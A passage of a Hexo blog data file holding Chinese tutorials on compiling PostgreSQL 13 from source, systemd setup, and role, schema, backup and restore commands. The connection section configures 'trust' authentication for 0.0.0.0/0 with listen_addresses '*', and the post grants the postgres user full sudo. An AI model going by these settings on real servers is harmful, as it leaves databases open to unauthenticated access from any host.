以Ubuntu为例\n\n下载PostgreSql源码包\n```shell\nwget https://ftp.postgresql.org/pub/source/v13.0/postgresql-13.0.tar.gz\n```\n\n解压源码包\n```shell\ntar -zxvf postgresql-13.0.tar.gz -C /home/\n```\n\n### 安装前准备工作\n\n安装编译工具及相关依赖\n```shell\n apt-get -y install zlib1g-dev libreadline-dev # 安装依赖\n apt-get -y install binutils\n apt-get -y install gcc\n apt-get -y install g++\n apt-get -y install sysstat\n apt-get -y install unixodbc unixodbc-dev\n```\n\n创建用户\n```shell\nadduser postgres\n```\n\npostgres用户提权`/etc/sudoers`\n```\npostgres ALL=(ALL:ALL) ALL\n```\n\n创建postgresql相关目录和文件夹所属关系\n```shell\nmkdir /home/postgres/data\nmkdir /home/postgres/init\nchown -R postgres:postgres /home/postgres\n```\n\n### 编译安装PostgreSql\n\n进入源码目录\n```shell\ncd /home/postgresql-13.0\n```\n\nconfigure执行配置准备构建环境\n```\n./configure --with-pgport=5432 \\\n  --prefix=/usr/local/pgsql \\\n  --with-systemd \\\n  --with-blocksize=8 \\\n  --with-segsize=1 \\\n  --with-wal-blocksize=8 \\\n  --without-readline \\\n  --datadir=/home/postgres/init\n```\n\n> configure参数说明\n\n```shell\n--with-pgport 指定端口\n--prefix  安装目录\n--with-systemd 编译对systemd 服务通知的支持。如果服务器是在systemd机制下被启动，这可以提高集成度，否则不会有影响 。要使用这个选项，必须安装libsystemd 以及相关的头文件\n--with-blocksize 设置块大小，单位K。2的N次幂，1-32K之间\n--with-segsize 超大数据表文件，会切分成若干个大小不超过SEGSIZE的小文件。该值的设置参考系统大文件的最大值。单位G。2的N次幂\n--with-wal-blocksize 指定WAL日志文件的大小,单位M。2的N次幂。设置区间 1 - 1024M\n--without-readline 避免使用Readline库（以及libedit）。这个选项禁用了psql中的命令行编辑和历史， 因此我们不建议这么做\n--without-zlib\t避免使用Zlib库。这样就禁用了pg_dump和 pg_restore中对压缩归档的支持。这个选项只适用于那些没有这个库的少见的系统\n```\n\n编译安装\n```shell\nmake && make install\n```\n\n### 初始化数据库\n\n执行下面的命令对数据库进行初始化，数据库的初始化需要切换到`postgres`用户\n```shell\nsu postgres\n/usr/local/pgsql/bin/initdb -D /home/postgres/data\n```\n\n创建systemd配置文件`/etc/systemd/system/pgserver.service`\n```shell\n[Unit]\nDescription=PostgreSQL database server\nDocumentation=man:postgres(1)\n\n[Service]\nType=notify\nUser=postgres\nExecStart=/usr/local/pgsql/bin/postgres -D /home/postgres/data\nExecReload=/bin/kill -HUP $MAINPID\nKillMode=mixed\nKillSignal=SIGINT\nTimeoutSec=0\n\n[Install]\nWantedBy=multi-user.target\n```\n\n配置开机启动并启动PostgreSQL\n```\nsystemctl enable pgserver --now\n```\n\n编辑`~/.bashrc`添加下面数据\n```shell\nalias psql=\"/usr/local/pgsql/bin/psql\"\nalias pg_dump=\"/usr/local/pgsql/bin/pg_dump\"\nalias pg_restore=\"/usr/local/pgsql/bin/pg_resotre\"\n```\n\n使其生效\n```shell\nsource ~/.bashrc\n```\n\n使用默认`postgres`用户登录\n```shell\npsql -p 5432\n```\n\n修改数据库用户`postgres`密码\n```shell\n\\password\n```\n\n### 连接配置\n\n修改`/home/postgres/data/postgresql.conf`配置文件，设置监听地址\n```shell\nlisten_addresses  = \"*\"\n```\n\n修改`/home/postgres/data/pg_hba.conf(host-based authentication file)`配置连接方式（添加）\n```shell\nhost    all    all    0.0.0.0/0    trust\n```\n\n修改配置后重启数据库服务即可\n```shell\nsystemctl restart pgserver\n```\n","slug":"Postgresql安装部署","published":1,"updated":"2023-03-10T02:53:40.197Z","_id":"cleqv9hzy0000usvg9u4w70j5","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"PostgreSql\"><a href=\"#PostgreSql\" class=\"headerlink\" title=\"PostgreSql\"></a>PostgreSql</h2><h3 id=\"下载postgresql源码\"><a href=\"#下载postgresql源码\" class=\"headerlink\" title=\"下载postgresql源码\"></a>下载postgresql源码</h3><blockquote>\n<p>以Ubuntu为例</p>\n</blockquote>\n<p>下载PostgreSql源码包</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">wget</span> https://ftp.postgresql.org/pub/source/v13.0/postgresql-13.0.tar.gz<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>解压源码包</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> postgresql-13.0.tar.gz <span class=\"token parameter variable\">-C</span> /home/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"安装前准备工作\"><a href=\"#安装前准备工作\" class=\"headerlink\" title=\"安装前准备工作\"></a>安装前准备工作</h3><p>安装编译工具及相关依赖</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> zlib1g-dev libreadline-dev <span class=\"token comment\"># 安装依赖</span>\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> binutils\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> gcc\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> g++\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> sysstat\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> unixodbc unixodbc-dev<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>创建用户</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">adduser postgres<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>postgres用户提权<code>/etc/sudoers</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">postgres ALL&#x3D;(ALL:ALL) ALL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>创建postgresql相关目录和文件夹所属关系</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /home/postgres/data\n<span class=\"token function\">mkdir</span> /home/postgres/init\n<span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> postgres:postgres /home/postgres<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"编译安装PostgreSql\"><a href=\"#编译安装PostgreSql\" class=\"headerlink\" title=\"编译安装PostgreSql\"></a>编译安装PostgreSql</h3><p>进入源码目录</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /home/postgresql-13.0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>configure执行配置准备构建环境</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.&#x2F;configure --with-pgport&#x3D;5432 \\\n  --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;pgsql \\\n  --with-systemd \\\n  --with-blocksize&#x3D;8 \\\n  --with-segsize&#x3D;1 \\\n  --with-wal-blocksize&#x3D;8 \\\n  --without-readline \\\n  --datadir&#x3D;&#x2F;home&#x2F;postgres&#x2F;init<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>configure参数说明</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">--with-pgport 指定端口\n<span class=\"token parameter variable\">--prefix</span>  安装目录\n--with-systemd 编译对systemd 服务通知的支持。如果服务器是在systemd机制下被启动，这可以提高集成度，否则不会有影响 。要使用这个选项，必须安装libsystemd 以及相关的头文件\n--with-blocksize 设置块大小，单位K。2的N次幂，1-32K之间\n--with-segsize 超大数据表文件，会切分成若干个大小不超过SEGSIZE的小文件。该值的设置参考系统大文件的最大值。单位G。2的N次幂\n--with-wal-blocksize 指定WAL日志文件的大小,单位M。2的N次幂。设置区间 <span class=\"token number\">1</span> - 1024M\n--without-readline 避免使用Readline库（以及libedit）。这个选项禁用了psql中的命令行编辑和历史， 因此我们不建议这么做\n--without-zlib\t避免使用Zlib库。这样就禁用了pg_dump和 pg_restore中对压缩归档的支持。这个选项只适用于那些没有这个库的少见的系统<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编译安装</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">make</span> <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"初始化数据库\"><a href=\"#初始化数据库\" class=\"headerlink\" title=\"初始化数据库\"></a>初始化数据库</h3><p>执行下面的命令对数据库进行初始化，数据库的初始化需要切换到<code>postgres</code>用户</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">su</span> postgres\n/usr/local/pgsql/bin/initdb <span class=\"token parameter variable\">-D</span> /home/postgres/data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>创建systemd配置文件<code>/etc/systemd/system/pgserver.service</code></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>Unit<span class=\"token punctuation\">]</span>\n<span class=\"token assign-left variable\">Description</span><span class=\"token operator\">=</span>PostgreSQL database server\n<span class=\"token assign-left variable\">Documentation</span><span class=\"token operator\">=</span>man:postgres<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">[</span>Service<span class=\"token punctuation\">]</span>\n<span class=\"token assign-left variable\">Type</span><span class=\"token operator\">=</span>notify\n<span class=\"token assign-left variable\">User</span><span class=\"token operator\">=</span>postgres\n<span class=\"token assign-left variable\">ExecStart</span><span class=\"token operator\">=</span>/usr/local/pgsql/bin/postgres <span class=\"token parameter variable\">-D</span> /home/postgres/data\n<span class=\"token assign-left variable\">ExecReload</span><span class=\"token operator\">=</span>/bin/kill <span class=\"token parameter variable\">-HUP</span> <span class=\"token variable\">$MAINPID</span>\n<span class=\"token assign-left variable\">KillMode</span><span class=\"token operator\">=</span>mixed\n<span class=\"token assign-left variable\">KillSignal</span><span class=\"token operator\">=</span>SIGINT\n<span class=\"token assign-left variable\">TimeoutSec</span><span class=\"token operator\">=</span><span class=\"token number\">0</span>\n\n<span class=\"token punctuation\">[</span>Install<span class=\"token punctuation\">]</span>\n<span class=\"token assign-left variable\">WantedBy</span><span class=\"token operator\">=</span>multi-user.target<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>配置开机启动并启动PostgreSQL</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">systemctl enable pgserver --now<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>编辑<code>~/.bashrc</code>添加下面数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">alias</span> <span class=\"token assign-left variable\">psql</span><span class=\"token operator\">=</span><span class=\"token string\">\"/usr/local/pgsql/bin/psql\"</span>\n<span class=\"token builtin class-name\">alias</span> <span class=\"token assign-left variable\">pg_dump</span><span class=\"token operator\">=</span><span class=\"token string\">\"/usr/local/pgsql/bin/pg_dump\"</span>\n<span class=\"token builtin class-name\">alias</span> <span class=\"token assign-left variable\">pg_restore</span><span class=\"token operator\">=</span><span class=\"token string\">\"/usr/local/pgsql/bin/pg_resotre\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>使其生效</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">source</span> ~/.bashrc<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用默认<code>postgres</code>用户登录</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">psql <span class=\"token parameter variable\">-p</span> <span class=\"token number\">5432</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改数据库用户<code>postgres</code>密码</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token punctuation\">\\</span>password<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"连接配置\"><a href=\"#连接配置\" class=\"headerlink\" title=\"连接配置\"></a>连接配置</h3><p>修改<code>/home/postgres/data/postgresql.conf</code>配置文件，设置监听地址</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">listen_addresses  <span class=\"token operator\">=</span> <span class=\"token string\">\"*\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改<code>/home/postgres/data/pg_hba.conf(host-based authentication file)</code>配置连接方式（添加）</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">host</span>    all    all    <span class=\"token number\">0.0</span>.0.0/0    trust<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改配置后重启数据库服务即可</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">systemctl restart pgserver<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"PostgreSql\"><a href=\"#PostgreSql\" class=\"headerlink\" title=\"PostgreSql\"></a>PostgreSql</h2><h3 id=\"下载postgresql源码\"><a href=\"#下载postgresql源码\" class=\"headerlink\" title=\"下载postgresql源码\"></a>下载postgresql源码</h3><blockquote>\n<p>以Ubuntu为例</p>\n</blockquote>\n<p>下载PostgreSql源码包</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">wget</span> https://ftp.postgresql.org/pub/source/v13.0/postgresql-13.0.tar.gz<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>解压源码包</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> postgresql-13.0.tar.gz <span class=\"token parameter variable\">-C</span> /home/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"安装前准备工作\"><a href=\"#安装前准备工作\" class=\"headerlink\" title=\"安装前准备工作\"></a>安装前准备工作</h3><p>安装编译工具及相关依赖</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> zlib1g-dev libreadline-dev <span class=\"token comment\"># 安装依赖</span>\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> binutils\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> gcc\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> g++\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> sysstat\n<span class=\"token function\">apt-get</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> unixodbc unixodbc-dev<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>创建用户</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">adduser postgres<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>postgres用户提权<code>/etc/sudoers</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">postgres ALL&#x3D;(ALL:ALL) ALL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>创建postgresql相关目录和文件夹所属关系</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /home/postgres/data\n<span class=\"token function\">mkdir</span> /home/postgres/init\n<span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> postgres:postgres /home/postgres<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"编译安装PostgreSql\"><a href=\"#编译安装PostgreSql\" class=\"headerlink\" title=\"编译安装PostgreSql\"></a>编译安装PostgreSql</h3><p>进入源码目录</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /home/postgresql-13.0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>configure执行配置准备构建环境</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.&#x2F;configure --with-pgport&#x3D;5432 \\\n  --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;pgsql \\\n  --with-systemd \\\n  --with-blocksize&#x3D;8 \\\n  --with-segsize&#x3D;1 \\\n  --with-wal-blocksize&#x3D;8 \\\n  --without-readline \\\n  --datadir&#x3D;&#x2F;home&#x2F;postgres&#x2F;init<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>configure参数说明</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">--with-pgport 指定端口\n<span class=\"token parameter variable\">--prefix</span>  安装目录\n--with-systemd 编译对systemd 服务通知的支持。如果服务器是在systemd机制下被启动，这可以提高集成度，否则不会有影响 。要使用这个选项，必须安装libsystemd 以及相关的头文件\n--with-blocksize 设置块大小，单位K。2的N次幂，1-32K之间\n--with-segsize 超大数据表文件，会切分成若干个大小不超过SEGSIZE的小文件。该值的设置参考系统大文件的最大值。单位G。2的N次幂\n--with-wal-blocksize 指定WAL日志文件的大小,单位M。2的N次幂。设置区间 <span class=\"token number\">1</span> - 1024M\n--without-readline 避免使用Readline库（以及libedit）。这个选项禁用了psql中的命令行编辑和历史， 因此我们不建议这么做\n--without-zlib\t避免使用Zlib库。这样就禁用了pg_dump和 pg_restore中对压缩归档的支持。这个选项只适用于那些没有这个库的少见的系统<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编译安装</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">make</span> <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"初始化数据库\"><a href=\"#初始化数据库\" class=\"headerlink\" title=\"初始化数据库\"></a>初始化数据库</h3><p>执行下面的命令对数据库进行初始化，数据库的初始化需要切换到<code>postgres</code>用户</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">su</span> postgres\n/usr/local/pgsql/bin/initdb <span class=\"token parameter variable\">-D</span> /home/postgres/data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>创建systemd配置文件<code>/etc/systemd/system/pgserver.service</code></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token punctuation\">[</span>Unit<span class=\"token punctuation\">]</span>\n<span class=\"token assign-left variable\">Description</span><span class=\"token operator\">=</span>PostgreSQL database server\n<span class=\"token assign-left variable\">Documentation</span><span class=\"token operator\">=</span>man:postgres<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">[</span>Service<span class=\"token punctuation\">]</span>\n<span class=\"token assign-left variable\">Type</span><span class=\"token operator\">=</span>notify\n<span class=\"token assign-left variable\">User</span><span class=\"token operator\">=</span>postgres\n<span class=\"token assign-left variable\">ExecStart</span><span class=\"token operator\">=</span>/usr/local/pgsql/bin/postgres <span class=\"token parameter variable\">-D</span> /home/postgres/data\n<span class=\"token assign-left variable\">ExecReload</span><span class=\"token operator\">=</span>/bin/kill <span class=\"token parameter variable\">-HUP</span> <span class=\"token variable\">$MAINPID</span>\n<span class=\"token assign-left variable\">KillMode</span><span class=\"token operator\">=</span>mixed\n<span class=\"token assign-left variable\">KillSignal</span><span class=\"token operator\">=</span>SIGINT\n<span class=\"token assign-left variable\">TimeoutSec</span><span class=\"token operator\">=</span><span class=\"token number\">0</span>\n\n<span class=\"token punctuation\">[</span>Install<span class=\"token punctuation\">]</span>\n<span class=\"token assign-left variable\">WantedBy</span><span class=\"token operator\">=</span>multi-user.target<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>配置开机启动并启动PostgreSQL</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">systemctl enable pgserver --now<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>编辑<code>~/.bashrc</code>添加下面数据</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">alias</span> <span class=\"token assign-left variable\">psql</span><span class=\"token operator\">=</span><span class=\"token string\">\"/usr/local/pgsql/bin/psql\"</span>\n<span class=\"token builtin class-name\">alias</span> <span class=\"token assign-left variable\">pg_dump</span><span class=\"token operator\">=</span><span class=\"token string\">\"/usr/local/pgsql/bin/pg_dump\"</span>\n<span class=\"token builtin class-name\">alias</span> <span class=\"token assign-left variable\">pg_restore</span><span class=\"token operator\">=</span><span class=\"token string\">\"/usr/local/pgsql/bin/pg_resotre\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>使其生效</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">source</span> ~/.bashrc<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用默认<code>postgres</code>用户登录</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">psql <span class=\"token parameter variable\">-p</span> <span class=\"token number\">5432</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改数据库用户<code>postgres</code>密码</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token punctuation\">\\</span>password<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"连接配置\"><a href=\"#连接配置\" class=\"headerlink\" title=\"连接配置\"></a>连接配置</h3><p>修改<code>/home/postgres/data/postgresql.conf</code>配置文件，设置监听地址</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">listen_addresses  <span class=\"token operator\">=</span> <span class=\"token string\">\"*\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改<code>/home/postgres/data/pg_hba.conf(host-based authentication file)</code>配置连接方式（添加）</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">host</span>    all    all    <span class=\"token number\">0.0</span>.0.0/0    trust<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改配置后重启数据库服务即可</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">systemctl restart pgserver<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n"},{"title":"PostgreSql操作","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-03-02T08:57:51.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"PostgreSql操作","_content":"\n## PostgreSql\n\n### 创建表空间\n\n创建本地表空间存放目录\n```\nmkdir -pv /home/pgsql13/postgresql/pgdata/dir1\nchown -R postgres:postgres /home/pgsql13/postgresql/pgdata\n```\n\n创建表空间\n```shell\ncreate tablespace 表空间名 owner postgres location '表空间本地目录';\n```\n\n### 创建数据库\n\n```shell\nCREATE DATABASE 数据库名字 WITH OWNER = postgres ENCODING = 'UTF8' LC_COLLATE = 'zh_CN.UTF-8' LC_CTYPE = 'zh_CN.UTF-8' TABLESPACE = 表空间名 CONNECTION LIMIT = -1;\n```\n\n### 用户角色创建\n\n角色即用户\n```shell\nCREATE ROLE 角色名 WITH LOGIN SUPERUSER NOCREATEDB CREATEROLE INHERIT NOREPLICATION CONNECTION LIMIT -1 PASSWORD '密码';\n```\n\n### 架构模式创建\n\n```shell\n# 删除自动生成的默认架构即模式\ndrop schema public cascade;\n# 每行会创建一个架构即模式 一般角色名和架构名字一样\nCREATE SCHEMA 架构名 AUTHORIZATION 角色名;\n# 每行授权一个架构即模式\nGRANT ALL ON SCHEMA 角色名 TO 结构名 WITH GRANT OPTION;\n```\n\n### 数据导出\n\n> 备份某个库下面的某个架构的数据包括架构，并指定了用户角色\n\n```shell\npg_dump -f xxx-$(date +\"%y%m%d\").dmp -p 端口 -U 登录用户名 --no-password -v -cC --role=角色 -Fc -b -E UTF8 -n 架构 -d 数据库名\n```\n\n> 备份整个库的数据包括架构\n\n```shell\npg_dump -f xxx-$(date +\"%y%m%d\").dmp -p 端口 -U 登录用户名 --no-password -v -cC -Fc -b -E UTF8 -d 数据库名\n```\n\n> 备份整个库的架构不包括数据\n\n```shell\npg_dump -f xxx-$(date +\"%y%m%d\").dmp -p 端口 -U 登录用户名 --no-password -s -cC -Fc -b -E UTF8 -d 数据库名\n```\n\n> 备份某个架构的所有视图\n\n```shell\n pg_dump -p 端口 -U 登录用户名 --no-password -v -cC -t 架构.view_\"*\" -t 架构.casesearchproject -d 数据库名 > view_all-$(date +\"%y%m%d\").sql\n```\n\n### 数据导入\n\n恢复某个架构包括数据\n```shell\npg_restore -p 端口 -d 数据库名 -O -x -v xxx-$(date +\"%y%m%d\").dmp --role=角色名 -n 架构名\n```\n\n恢复某个架构不包括数据\n```shell\npg_restore -p 端口 -d 数据库名 -O -x -v xxx-$(date +\"%y%m%d\").dmp -s --role=角色名 -n 架构名\n```\n\n恢复整个数据库包括数据\n```shell\npg_restore -p 端口 -d 数据库名 -O -x -v xxx-$(date +\"%y%m%d\").dmp\n```\n恢复整个数据库不包括数据\n```shell\npg_restore -p 端口 -d 数据库名 -O -x -s -v xxx-$(date +\"%y%m%d\").dmp\n```\n\n恢复某个架构的所有视图\n```shell\npsql -p 端口 -d 数据库名 -v -f view_all-$(date +\"%y%m%d\").sql\n```\n\n\n","source":"_posts/PostgreSql操作.md","raw":"---\ntitle: PostgreSql操作\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-03-02 16:57:51\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: PostgreSql操作\ntags: db\ncategories: pgsql\n---\n\n## PostgreSql\n\n### 创建表空间\n\n创建本地表空间存放目录\n```\nmkdir -pv /home/pgsql13/postgresql/pgdata/dir1\nchown -R postgres:postgres /home/pgsql13/postgresql/pgdata\n```\n\n创建表空间\n```shell\ncreate tablespace 表空间名 owner postgres location '表空间本地目录';\n```\n\n### 创建数据库\n\n```shell\nCREATE DATABASE 数据库名字 WITH OWNER = postgres ENCODING = 'UTF8' LC_COLLATE = 'zh_CN.UTF-8' LC_CTYPE = 'zh_CN.UTF-8' TABLESPACE = 表空间名 CONNECTION LIMIT = -1;\n```\n\n### 用户角色创建\n\n角色即用户\n```shell\nCREATE ROLE 角色名 WITH LOGIN SUPERUSER NOCREATEDB CREATEROLE INHERIT NOREPLICATION CONNECTION LIMIT -1 PASSWORD '密码';\n```\n\n### 架构模式创建\n\n```shell\n# 删除自动生成的默认架构即模式\ndrop schema public cascade;\n# 每行会创建一个架构即模式 一般角色名和架构名字一样\nCREATE SCHEMA 架构名 AUTHORIZATION 角色名;\n# 每行授权一个架构即模式\nGRANT ALL ON SCHEMA 角色名 TO 结构名 WITH GRANT OPTION;\n```\n\n### 数据导出\n\n> 备份某个库下面的某个架构的数据包括架构，并指定了用户角色\n\n```shell\npg_dump -f xxx-$(date +\"%y%m%d\").dmp -p 端口 -U 登录用户名 --no-password -v -cC --role=角色 -Fc -b -E UTF8 -n 架构 -d 数据库名\n```\n\n> 备份整个库的数据包括架构\n\n```shell\npg_dump -f xxx-$(date +\"%y%m%d\").dmp -p 端口 -U 登录用户名 --no-password -v -cC -Fc -b -E UTF8 -d 数据库名\n```\n\n> 备份整个库的架构不包括数据\n\n```shell\npg_dump -f xxx-$(date 